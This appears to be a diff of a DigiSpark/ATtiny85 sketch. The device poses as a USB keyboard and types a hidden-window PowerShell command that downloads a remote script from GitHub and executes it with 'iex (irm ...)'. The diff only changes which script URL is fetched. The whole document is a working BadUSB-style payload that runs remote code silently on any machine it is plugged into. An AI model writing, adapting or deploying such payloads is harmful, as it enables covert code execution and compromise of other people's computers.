@@ -16,12 +16,10 @@ void loop() {
   // Writes the command
   DigiKeyboard.print("powershell -w h ");
   DigiKeyboard.print("iex (irm \"");
-  DigiKeyboard.print("https://raw.githubusercontent.com/msr8/attiny85/main/Shell%20Scripts/powershell/speak.ps1");  // LINK HERE
+  DigiKeyboard.print("https://raw.githubusercontent.com/Prutserdt/dotfiles/master/Stack/Code/Powershell/script.ps1");  // LINK HERE
   DigiKeyboard.print("\")");
   // Enters it
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-
-
 
   for (;;) {/* Stops the loop */}
 }
